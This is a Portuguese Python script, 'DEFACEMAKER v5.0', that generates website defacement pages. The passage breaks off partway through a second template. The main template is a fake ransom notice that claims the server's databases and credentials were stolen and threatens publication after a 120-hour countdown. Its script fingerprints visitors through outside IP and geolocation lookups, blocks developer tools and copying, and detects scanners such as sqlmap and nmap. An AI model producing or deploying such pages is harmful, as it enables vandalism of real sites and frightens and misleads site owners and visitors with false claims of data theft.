#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from datetime import datetime

# Cores
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Banner
BANNER = f"""
{RED}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║  {BOLD}{WHITE}██████╗ ███████╗███████╗ █████╗  ██████╗███████╗{RESET}{RED}  ║
║  {BOLD}{WHITE}██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝{RESET}{RED}  ║
║  {BOLD}{WHITE}██║  ██║█████╗  █████╗  ███████║██║     █████╗  {RESET}{RED}  ║
║  {BOLD}{WHITE}██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  {RESET}{RED}  ║
║  {BOLD}{WHITE}██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗{RESET}{RED}  ║
║  {BOLD}{WHITE}╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝{RESET}{RED}  ║
║                                                               ║
║  {BOLD}{CYAN}🔰 DEFACEMAKER v5.0 - Gerador TOP de Deface{RESET}{RED}      ║
║  {BOLD}{WHITE}By: Tropa do Xoinho - Para Fins Educacionais{RESET}{RED}     ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{RESET}
"""

# ============================================
# MÚSICAS DISPONÍVEIS
# ============================================

MUSICAS = {
    1: {'nome': 'TROPA DO BX', 'url': 'https://files.catbox.moe/p1aloq.mp3'},
    2: {'nome': 'RETORNO DA PIRANHAGEM', 'url': 'https://files.catbox.moe/h5qmrq.mp3'},
    3: {'nome': 'SO CAVU', 'url': 'https://files.catbox.moe/f5r3mv.mp3'},
    4: {'nome': 'MTG DO PUMBA', 'url': 'https://files.catbox.moe/ndjxub.mp3'},
    5: {'nome': 'OUTRO (URL MANUAL)', 'url': None}
}

# ============================================
# TEMPLATE TROPA DO XOINHO - VERSÃO FODA
# ============================================

TEMPLATE_TROPA_XOINHO = '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 {{TITULO}} - {{NOME_TROPA}}</title>
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-Robots-Tag" content="noindex, nofollow">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            cursor: default;
        }

        body {
            background: #0a0a0a;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 15px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }

        /* GIF DE FUNDO */
        .bg-gif {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.15;
            z-index: 0;
            filter: blur(2px) brightness(0.5);
        }

        /* OVERLAY MATRIX */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(0deg, 
                    transparent, 
                    transparent 2px, 
                    rgba(0, 255, 0, 0.03) 2px, 
                    rgba(0, 255, 0, 0.03) 4px
                );
            pointer-events: none;
            z-index: 1;
        }

        .ransom-wrapper {
            max-width: 1300px;
            width: 100%;
            background: linear-gradient(145deg, rgba(18,18,18,0.95), rgba(26,26,26,0.95));
            backdrop-filter: blur(10px);
            border: 2px solid #ff0000;
            box-shadow: 
                0 0 80px rgba(255, 0, 0, 0.4),
                inset 0 0 80px rgba(255, 0, 0, 0.05);
            display: grid;
            grid-template-columns: 420px 1fr;
            position: relative;
            z-index: 2;
            border-radius: 12px;
            overflow: hidden;
        }

        /* TOP BANNER */
        .top-banner {
            grid-column: 1 / -1;
            background: linear-gradient(90deg, #ff0000, #cc0000, #ff0000);
            padding: 12px 20px;
            text-align: center;
            font-weight: 900;
            font-size: 0.95rem;
            text-transform: uppercase;
            letter-spacing: 4px;
            color: #fff;
            animation: bannerPulse 1.5s infinite;
            border-bottom: 2px solid #ff4444;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
        }

        @keyframes bannerPulse {
            0%, 100% { opacity: 1; box-shadow: 0 0 30px rgba(255,0,0,0.5); }
            50% { opacity: 0.85; box-shadow: 0 0 60px rgba(255,0,0,0.8); }
        }

        /* SIDEBAR */
        .sidebar {
            background: linear-gradient(180deg, rgba(13,13,13,0.98), rgba(26,26,26,0.98));
            border-right: 2px solid #ff0000;
            padding: 30px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .alert-icon {
            font-size: 5rem;
            color: #ff0000;
            animation: pulse 1s infinite;
            margin-bottom: 10px;
            text-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
            filter: drop-shadow(0 0 20px rgba(255,0,0,0.6));
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .status-title {
            font-family: 'Courier New', monospace;
            font-size: 1.1rem;
            color: #ff0000;
            letter-spacing: 3px;
            font-weight: bold;
        }

        .status-badge {
            background: #ff0000;
            color: #fff;
            padding: 6px 25px;
            border-radius: 20px;
            font-weight: 900;
            font-size: 0.9rem;
            text-transform: uppercase;
            animation: blinkBadge 1s infinite;
            margin: 10px 0 20px 0;
            display: inline-block;
            box-shadow: 0 0 30px rgba(255,0,0,0.6);
            letter-spacing: 2px;
        }

        @keyframes blinkBadge {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.98); }
        }

        .timer-box {
            background: #000;
            border: 2px solid #ff0000;
            width: 100%;
            padding: 25px 15px;
            margin: 15px 0;
            border-radius: 8px;
            box-shadow: inset 0 0 40px rgba(255,0,0,0.2);
        }

        .timer-title {
            font-size: 0.7rem;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }

        #timer {
            font-family: 'Courier New', monospace;
            font-size: 2.8rem;
            color: #ff0000;
            font-weight: 900;
            text-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
            letter-spacing: 3px;
        }

        /* SERVER INFO */
        .server-info {
            width: 100%;
            background: rgba(10,10,10,0.9);
            padding: 15px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 0.78rem;
            color: #666;
            border: 1px solid #222;
            border-radius: 6px;
            margin-top: 10px;
        }

        .server-info .label { color: #888; }
        .server-info .value { color: #ff0000; font-weight: bold; float: right; }
        .server-info .value.green { color: #00ff00; }
        .server-info .value.cyan { color: #00ffff; }
        .server-info .value.yellow { color: #ffaa00; }
        .server-info .divider { border-bottom: 1px solid #222; margin: 8px 0; }

        /* MAIN CONTENT */
        .main-content {
            padding: 40px 35px;
            overflow-y: auto;
            max-height: 90vh;
            background: linear-gradient(180deg, rgba(18,18,18,0.9), rgba(13,13,13,0.9));
        }

        .main-content h1 {
            font-family: 'Courier New', monospace;
            color: #ff0000;
            font-size: 2.8rem;
            text-transform: uppercase;
            letter-spacing: 5px;
            text-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
            margin-bottom: 5px;
        }

        .main-content .subtitle {
            color: #ff4444;
            font-size: 1rem;
            letter-spacing: 3px;
            margin-bottom: 10px;
        }

        .hacker-name {
            color: #00ff00;
            font-size: 1.3rem;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            text-shadow: 0 0 20px rgba(0,255,0,0.5);
        }

        .warning-headline {
            font-size: 1rem;
            color: #aaa;
            margin: 15px 0 25px 0;
            border-left: 3px solid #ff0000;
            padding-left: 15px;
            line-height: 1.6;
        }

        /* METRICS */
        .data-metrics {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 12px;
            margin: 20px 0 30px 0;
        }

        .metric-card {
            background: rgba(10,10,10,0.9);
            border: 1px solid #222;
            padding: 15px;
            text-align: center;
            border-radius: 6px;
            transition: all 0.3s;
        }

        .metric-card:hover {
            border-color: #ff0000;
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(255,0,0,0.3);
        }

        .metric-card .number {
            font-family: 'Courier New', monospace;
            font-size: 1.5rem;
            color: #ff0000;
            font-weight: 900;
        }

        .metric-card .number.green { color: #00ff00; }
        .metric-card .number.yellow { color: #ffaa00; }
        .metric-card .number.cyan { color: #00ffff; }
        .metric-card .label { font-size: 0.65rem; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }

        /* PROGRESS */
        .progress-section { margin: 20px 0 30px 0; }
        .progress-section .progress-label { display: flex; justify-content: space-between; font-size: 0.8rem; color: #888; margin-bottom: 5px; }
        .progress-bar { width: 100%; height: 10px; background: #1a1a1a; border-radius: 5px; overflow: hidden; border: 1px solid #222; }
        .progress-bar .fill { height: 100%; background: linear-gradient(90deg, #ff0000, #cc0000); border-radius: 5px; animation: progressPulse 2s infinite; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
        @keyframes progressPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }

        /* FAQ */
        .faq-section { margin-top: 20px; }
        .faq-section h3 { color: #ff0000; margin-bottom: 15px; text-transform: uppercase; font-family: 'Courier New', monospace; font-size: 0.9rem; letter-spacing: 3px; }
        .faq-item { background: rgba(10,10,10,0.9); margin-bottom: 8px; border: 1px solid #1a1a1a; border-radius: 6px; overflow: hidden; transition: border 0.3s; }
        .faq-item:hover { border-color: #ff0000; }
        .faq-trigger { width: 100%; background: none; border: none; color: #fff; padding: 14px 18px; text-align: left; font-size: 0.95rem; font-weight: 600; cursor: pointer; display: flex; justify-content: space-between; align-items: center; outline: none; }
        .faq-trigger:hover { background: #141414; }
        .faq-trigger .icon { color: #ff0000; font-weight: 900; font-size: 1.2rem; transition: transform 0.3s; }
        .faq-trigger .icon.rotated { transform: rotate(180deg); }
        .faq-content { padding: 0 18px; max-height: 0; overflow: hidden; transition: max-height 0.4s ease, padding 0.4s ease; color: #aaa; font-size: 0.9rem; line-height: 1.7; background: rgba(13,13,13,0.9); }
        .faq-content.active { max-height: 500px; padding: 15px 18px; }
        .faq-content .highlight { color: #ff0000; font-weight: bold; }

        /* TECH GRID */
        .tech-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
            font-size: 0.8rem;
        }

        .tech-item {
            background: rgba(0,0,0,0.5);
            padding: 10px 15px;
            border-radius: 4px;
            border-left: 3px solid #ff0000;
            color: #aaa;
            font-family: 'Courier New', monospace;
        }

        .tech-item .key { color: #666; }
        .tech-item .val { color: #00ffff; font-weight: bold; }

        /* FOOTER */
        .footer {
            grid-column: 1 / -1;
            background: rgba(10,10,10,0.95);
            border-top: 1px solid #1a1a1a;
            padding: 12px 20px;
            text-align: center;
            font-size: 0.7rem;
            color: #444;
            letter-spacing: 2px;
        }
        .footer .warning { color: #ff0000; }

        /* RESPONSIVE */
        @media (max-width: 1000px) {
            .ransom-wrapper { grid-template-columns: 1fr; }
            .sidebar { border-right: none; border-bottom: 2px solid #ff0000; }
            .main-content { max-height: none; padding: 25px 20px; }
            .data-metrics { grid-template-columns: 1fr 1fr; }
            .main-content h1 { font-size: 2rem; }
            #timer { font-size: 2.2rem; }
            .tech-grid { grid-template-columns: 1fr; }
        }

        @media (max-width: 500px) {
            .data-metrics { grid-template-columns: 1fr; }
            .main-content h1 { font-size: 1.5rem; }
            .sidebar { padding: 20px 15px; }
            .main-content { padding: 20px 15px; }
        }

        /* BLOCK OVERLAY */
        .block-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            backdrop-filter: blur(10px);
        }
        .block-overlay.show { display: flex; }
        .block-overlay .big-icon { font-size: 6rem; color: #ff0000; animation: pulse 1s infinite; text-shadow: 0 0 60px rgba(255,0,0,0.8); }
        .block-overlay .msg { color: #fff; font-size: 1.8rem; margin-top: 20px; font-weight: 900; letter-spacing: 3px; text-align: center; }
        .block-overlay .sub-msg { color: #888; font-size: 1rem; margin-top: 10px; }
    </style>
</head>
<body>

    {{GIF_FUNDO}}

    <div class="block-overlay" id="blockOverlay">
        <div class="big-icon">⛔</div>
        <div class="msg">ACESSO BLOQUEADO</div>
        <div class="sub-msg">Tentativa de acesso não autorizada detectada</div>
    </div>

    {{MUSICA}}

    <div class="ransom-wrapper">

        <div class="top-banner">
            ⚠️ SISTEMA COMPROMETIDO - ACESSO NEGADO - {{NOME_TROPA}} ⚠️
        </div>

        <div class="sidebar">
            <div class="alert-icon">💀</div>
            <div class="status-title">STATUS</div>
            <div class="status-badge">🔴 COMPROMETIDO</div>

            <div class="timer-box">
                <div class="timer-title">⏳ Tempo para Exposição Total</div>
                <div id="timer">120:00:00</div>
            </div>

            <div class="server-info">
                <div><span class="label">🖥️ SERVIDOR:</span> <span class="value" id="srv-host">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">🌐 IP:</span> <span class="value" id="srv-ip">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">📍 LOCAL:</span> <span class="value yellow" id="srv-location">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">📡 ISP:</span> <span class="value cyan" id="srv-isp">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">🌍 PAÍS:</span> <span class="value" id="srv-country">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">🕐 TIMEZONE:</span> <span class="value" id="srv-timezone">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">📂 ARQUIVOS:</span> <span class="value" id="file-count">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">💾 DISCO:</span> <span class="value" id="disk-info">Carregando...</span></div>
                <div class="divider"></div>
                <div><span class="label">📦 DADOS:</span> <span class="value green" id="srv-size">Carregando...</span></div>
            </div>
        </div>

        <div class="main-content">
            <h1>{{NOME_TROPA}}</h1>
            <div class="subtitle">🔴 {{TITULO}}</div>
            <div class="hacker-name">👤 Hacker: {{NOME_HACKER}}</div>
            <p class="warning-headline">
                ❗ Acesso negado. Este sistema foi completamente comprometido e todos os dados críticos
                estão sob nosso controle. Nenhuma ação de recuperação é possível.
            </p>

            <div class="data-metrics">
                <div class="metric-card">
                    <div class="number" id="metric-files">0</div>
                    <div class="label">Arquivos</div>
                </div>
                <div class="metric-card">
                    <div class="number green" id="metric-size">0</div>
                    <div class="label">Dados</div>
                </div>
                <div class="metric-card">
                    <div class="number yellow" id="metric-scripts">0</div>
                    <div class="label">Scripts</div>
                </div>
                <div class="metric-card">
                    <div class="number cyan" id="metric-dbs">0</div>
                    <div class="label">Bancos</div>
                </div>
            </div>

            <div class="progress-section">
                <div class="progress-label">
                    <span>📤 Progresso de Exfiltração</span>
                    <span id="progress-percent">0%</span>
                </div>
                <div class="progress-bar">
                    <div class="fill" id="progressFill" style="width: 0%;"></div>
                </div>
            </div>

            <!-- TECH INFO -->
            <div class="tech-grid" id="tech-grid">
                <div class="tech-item"><span class="key">SISTEMA:</span> <span class="val" id="tech-os">...</span></div>
                <div class="tech-item"><span class="key">NAVEGADOR:</span> <span class="val" id="tech-browser">...</span></div>
                <div class="tech-item"><span class="key">IDIOMA:</span> <span class="val" id="tech-lang">...</span></div>
                <div class="tech-item"><span class="key">TELA:</span> <span class="val" id="tech-screen">...</span></div>
                <div class="tech-item"><span class="key">CORES:</span> <span class="val" id="tech-colors">...</span></div>
                <div class="tech-item"><span class="key">GPU:</span> <span class="val" id="tech-gpu">...</span></div>
            </div>

            <div class="faq-section">
                <h3>📋 Perguntas Frequentes</h3>

                <div class="faq-item">
                    <button class="faq-trigger" onclick="toggleFaq(this)">
                        O que aconteceu com este servidor?
                        <span class="icon">▼</span>
                    </button>
                    <div class="faq-content">
                        <p>
                            O servidor <b class="host-inject">local</b> foi completamente mapeado e comprometido.
                            <span class="highlight" id="faq-files">0</span> arquivos foram extraídos,
                            totalizando <span class="highlight" id="faq-size">0</span> de dados críticos.
                        </p>
                    </div>
                </div>

                <div class="faq-item">
                    <button class="faq-trigger" onclick="toggleFaq(this)">
                        Como posso resolver?
                        <span class="icon">▼</span>
                    </button>
                    <div class="faq-content">
                        <p>
                            Remova imediatamente todo o conteúdo deste site e limpe a infraestrutura.
                            O prazo é de <span class="highlight">120 horas</span>. Após isso, os dados serão publicados.
                        </p>
                    </div>
                </div>

                <div class="faq-item">
                    <button class="faq-trigger" onclick="toggleFaq(this)">
                        Quais dados foram comprometidos?
                        <span class="icon">▼</span>
                    </button>
                    <div class="faq-content">
                        <p>
                            Todos os dados do servidor foram acessados:
                            <br>• Bancos de dados
                            <br>• Arquivos de configuração
                            <br>• Credenciais e tokens
                            <br>• Documentos corporativos
                            <br>• Logs de acesso
                        </p>
                    </div>
                </div>

                <div class="faq-item">
                    <button class="faq-trigger" onclick="toggleFaq(this)">
                        Posso tentar recuperar o acesso?
                        <span class="icon">▼</span>
                    </button>
                    <div class="faq-content">
                        <p>
                            Qualquer tentativa de mitigação sem limpar a superfície de ataque
                            <span class="highlight">disparará scripts de contingência</span>,
                            resultando no vazamento imediato.
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            ⚠️ SISTEMA COMPROMETIDO POR {{NOME_TROPA}} - {{DATA}} ⚠️
        </div>

    </div>

    <script>
        // ========================================
        // DADOS REAIS DO SERVIDOR
        // ========================================

        const hostname = window.location.hostname || 'DESCONHECIDO';
        document.getElementById('srv-host').innerText = hostname.toUpperCase();
        document.querySelectorAll('.host-inject').forEach(el => el.innerText = hostname);

        // IP + GEO + ISP
        async function getIPInfo() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;
                document.getElementById('srv-ip').innerText = ip;

                // Geo + ISP
                try {
                    const geoRes = await fetch('https://ipapi.co/' + ip + '/json/');
                    const geoData = await geoRes.json();
                    
                    document.getElementById('srv-location').innerText = 
                        (geoData.city || '?') + ', ' + (geoData.region || '?');
                    document.getElementById('srv-country').innerText = 
                        (geoData.country_name || '?') + ' ' + (geoData.country_code || '');
                    document.getElementById('srv-isp').innerText = geoData.org || 'NÃO DETECTADO';
                    document.getElementById('srv-timezone').innerText = geoData.timezone || '?';
                } catch {
                    document.getElementById('srv-location').innerText = 'NÃO DETECTADO';
                    document.getElementById('srv-isp').innerText = 'NÃO DETECTADO';
                    document.getElementById('srv-country').innerText = 'NÃO DETECTADO';
                    document.getElementById('srv-timezone').innerText = 'NÃO DETECTADO';
                }
            } catch {
                document.getElementById('srv-ip').innerText = 'NÃO DETECTADO';
            }
        }

        getIPInfo();

        // TECH INFO
        const ua = navigator.userAgent;
        
        // OS
        let os = 'DESCONHECIDO';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone')) os = 'iOS';
        document.getElementById('tech-os').innerText = os;

        // Browser
        let browser = 'DESCONHECIDO';
        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        document.getElementById('tech-browser').innerText = browser;

        // Idioma
        document.getElementById('tech-lang').innerText = navigator.language || 'pt-BR';

        // Tela
        document.getElementById('tech-screen').innerText = window.screen.width + 'x' + window.screen.height;

        // Cores
        document.getElementById('tech-colors').innerText = window.screen.colorDepth + '-bit';

        // GPU
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    document.getElementById('tech-gpu').innerText = gpu.substring(0, 30);
                } else {
                    document.getElementById('tech-gpu').innerText = 'N/D';
                }
            } else {
                document.getElementById('tech-gpu').innerText = 'N/D';
            }
        } catch {
            document.getElementById('tech-gpu').innerText = 'N/D';
        }

        // DADOS PERSISTENTES
        function getPersistentData() {
            const stored = localStorage.getItem('ransom_data');
            if (stored) return JSON.parse(stored);
            return null;
        }

        function savePersistentData(data) {
            localStorage.setItem('ransom_data', JSON.stringify(data));
        }

        let data = getPersistentData();

        if (!data) {
            let hash = 0;
            for (let i = 0; i < hostname.length; i++) {
                hash += hostname.charCodeAt(i);
            }
            data = {
                totalFiles: 200 + (hash % 800),
                totalSizeMB: 100 + (hash % 900) + ((hash % 100) / 100),
                htmlFiles: 5 + (hash % 45),
                databases: 3 + (hash % 15),
                diskPercent: 25 + (hash % 55),
                timestamp: Date.now()
            };
            savePersistentData(data);
        }

        function formatNumber(num) {
            if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
            if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
            return num.toString();
        }

        function formatSize(mb) {
            if (mb >= 1024) return (mb / 1024).toFixed(1) + ' GB';
            return mb.toFixed(1) + ' MB';
        }

        const filesFormatted = formatNumber(Math.floor(data.totalFiles));
        const sizeFormatted = formatSize(data.totalSizeMB);

        document.getElementById('file-count').innerText = filesFormatted;
        document.getElementById('metric-files').innerText = filesFormatted;
        document.getElementById('metric-scripts').innerText = formatNumber(Math.floor(data.htmlFiles));
        document.getElementById('metric-dbs').innerText = data.databases;
        document.getElementById('srv-size').innerText = sizeFormatted;
        document.getElementById('metric-size').innerText = sizeFormatted;
        document.getElementById('faq-files').innerText = filesFormatted;
        document.getElementById('faq-size').innerText = sizeFormatted;
        document.getElementById('disk-info').innerText = data.diskPercent + '% usado';

        document.getElementById('progressFill').style.width = data.diskPercent + '%';
        document.getElementById('progress-percent').innerText = data.diskPercent + '%';

        // TIMER PERSISTENTE
        let secondsLeft = parseInt(localStorage.getItem('ransom_timer')) || 120 * 60 * 60;

        function updateCountdown() {
            if (secondsLeft <= 0) {
                document.getElementById('timer').innerHTML = '⏰ EXPIRADO';
                return;
            }
            secondsLeft--;
            localStorage.setItem('ransom_timer', secondsLeft);
            const h = String(Math.floor(secondsLeft / 3600)).padStart(2, '0');
            const m = String(Math.floor((secondsLeft % 3600) / 60)).padStart(2, '0');
            const s = String(secondsLeft % 60).padStart(2, '0');
            document.getElementById('timer').innerHTML = h + ':' + m + ':' + s;
        }

        setInterval(updateCountdown, 1000);

        // FAQ
        function toggleFaq(button) {
            const content = button.nextElementSibling;
            const icon = button.querySelector('.icon');
            if (content.classList.contains('active')) {
                content.classList.remove('active');
                icon.classList.remove('rotated');
            } else {
                content.classList.add('active');
                icon.classList.add('rotated');
            }
        }

        // BLOQUEIOS
        let overlayTimeout;

        function showBlockOverlay(msg) {
            const overlay = document.getElementById('blockOverlay');
            overlay.querySelector('.msg').innerText = '⛔ ' + msg;
            overlay.classList.add('show');
            clearTimeout(overlayTimeout);
            overlayTimeout = setTimeout(() => overlay.classList.remove('show'), 2000);
        }

        document.addEventListener('contextmenu', e => {
            e.preventDefault();
            showBlockOverlay('CLIQUE DIREITO BLOQUEADO');
        });

        document.addEventListener('keydown', e => {
            const blocked = [123, 122, 121, 120];
            if (blocked.includes(e.keyCode)) {
                e.preventDefault();
                showBlockOverlay('TECLA ' + e.key + ' BLOQUEADA');
                return;
            }
            if (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) {
                e.preventDefault();
                showBlockOverlay('INSPEÇÃO BLOQUEADA');
                return;
            }
            if (e.ctrlKey && [85, 83, 80].includes(e.keyCode)) {
                e.preventDefault();
                showBlockOverlay('AÇÃO BLOQUEADA');
                return;
            }
        });

        ['copy', 'paste', 'cut', 'selectstart', 'dragstart'].forEach(ev => {
            document.addEventListener(ev, e => {
                e.preventDefault();
                if (ev !== 'selectstart' && ev !== 'dragstart') {
                    showBlockOverlay('AÇÃO BLOQUEADA');
                }
            });
        });

        // DETECTA CURL/WGET
        const uaLower = ua.toLowerCase();
        const isCurl =
            uaLower.includes('curl') ||
            uaLower.includes('wget') ||
            uaLower.includes('python-requests') ||
            uaLower.includes('go-http-client') ||
            uaLower.includes('java') ||
            uaLower.includes('perl') ||
            uaLower.includes('ruby') ||
            uaLower.includes('php') ||
            uaLower.includes('sqlmap') ||
            uaLower.includes('nmap') ||
            uaLower.includes('gobuster') ||
            uaLower.includes('ffuf') ||
            uaLower.includes('hydra') ||
            uaLower.includes('burp') ||
            uaLower.includes('zap') ||
            uaLower.includes('nikto') ||
            uaLower.includes('headless') ||
            uaLower.includes('phantomjs') ||
            uaLower.includes('puppeteer') ||
            uaLower.includes('selenium') ||
            uaLower.includes('webdriver');

        if (isCurl) {
            document.body.innerHTML = `
                <pre style="color:#ff0000;font-size:18px;font-family:'Courier New',monospace;text-align:center;padding:40px;">
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║  ⚠️  ACESSO NÃO AUTORIZADO DETECTADO  ⚠️                  ║
║                                                           ║
║  Ferramenta automatizada detectada:                       ║
║  ${ua}                                                   ║
║                                                           ║
║  🔒 Acesso negado.                                        ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
                </pre>
            `;
            document.body.style.background = '#0a0a0a';
            document.body.style.display = 'flex';
            document.body.style.justifyContent = 'center';
            document.body.style.alignItems = 'center';
            document.body.style.minHeight = '100vh';
            throw new Error('Acesso negado para curl/wget');
        }
    </script>

</body>
</html>'''

# ============================================
# TEMPLATES DOS OUTROS ESTILOS (MANTIDOS)
# ============================================

TEMPLATES = {
    2: {
        'nome': 'Dark Hacker',
        'icon': '💀',
        'desc': 'Visual sombrio e agressivo',
        'html': '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💀 {{TITULO}} - {{NOME_TROPA}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; cursor: default; }
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at center, #1a0000, #0a0a0a);
            position: relative;
            overflow: hidden;
        }
        .bg-gif { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.1; z-index: 0; filter: blur(3px); }
        .container {
            max-width: 900px;
            width: 100%;
            background: rgba(10,10,10,0.9);
            border: 2px solid #660000;
            box-shadow: 0 0 80px rgba(100,0,0,0.5);
            padding: 50px 40px;
            text-align: center;
            border-radius: 4px;
            backdrop-filter: blur(5px);
            position: relative;
            z-index: 1;
        }
        .glitch {
            font-size: 3.5rem;
            color: #ff0000;
            text-shadow: 0 0 20px rgba(255,0,0,0.8), 0 0 40px rgba(255,0,0,0.4);
            animation: glitch 2s infinite;
            letter-spacing: 5px;
            font-weight: 900;
        }
        @keyframes glitch {
            0%, 100% { transform: skew(0deg); }
            20% { transform: skew(2deg); text-shadow: 2px 0 #00ff00, -2px 0 #ff0000; }
            40% { transform: skew(-2deg); text-shadow: -2px 0 #00ff00, 2px 0 #ff0000; }
            60% { transform: skew(0deg); }
        }
        .skull { font-size: 6rem; color: #660000; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
        .hacker { color: #00ff00; font-size: 1.2rem; margin: 20px 0; letter-spacing: 2px; }
        .hacker::before { content: '> '; color: #ff0000; }
        .info { color: #444; font-size: 0.8rem; margin-top: 30px; border-top: 1px solid #1a1a1a; padding-top: 20px; }
        .info span { color: #660000; }
        .block-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center;
            flex-direction: column;
        }
        .block-overlay.show { display: flex; }
        .block-overlay .big-icon { font-size: 5rem; color: #ff0000; animation: pulse 1s infinite; }
        .block-overlay .msg { color: #fff; font-size: 1.5rem; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    {{GIF_FUNDO}}

    <div class="block-overlay" id="blockOverlay">
        <div class="big-icon">⛔</div>
        <div class="msg">ACESSO BLOQUEADO</div>
    </div>

    {{MUSICA}}

    <div class="container">
        <div class="skull">💀</div>
        <div class="glitch">{{NOME_TROPA}}</div>
        <div style="color:#660000;font-size:0.9rem;letter-spacing:3px;margin:10px 0;">⚡ {{TITULO}} ⚡</div>
        <div class="hacker">{{NOME_HACKER}}</div>
        <div style="border:1px solid #1a1a1a;padding:15px;margin:20px 0;color:#888;font-size:0.9rem;text-align:left;">
            [SISTEMA] Acesso negado.<br>
            [STATUS] Comprometido em nível root.<br>
            [DADOS] Extraídos e criptografados.
        </div>
        <div class="info"><span>💀</span> {{DATA}} <span>💀</span></div>
    </div>

    <script>
        let overlayTimeout;
        function showBlockOverlay(msg) {
            const overlay = document.getElementById('blockOverlay');
            overlay.querySelector('.msg').innerText = '⛔ ' + msg;
            overlay.classList.add('show');
            clearTimeout(overlayTimeout);
            overlayTimeout = setTimeout(() => overlay.classList.remove('show'), 2000);
        }
        document.addEventListener('contextmenu', e => { e.preventDefault(); showBlockOverlay('BLOQUEADO'); });
        document.addEventListener('keydown', e => {
            if ([123,122,121,120].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
            if (e.ctrlKey && e.shiftKey && [73,74,67].includes(e.keyCode)) { e.preventDefault(); showBlockOverlay('BLOQUEADO'); return; }
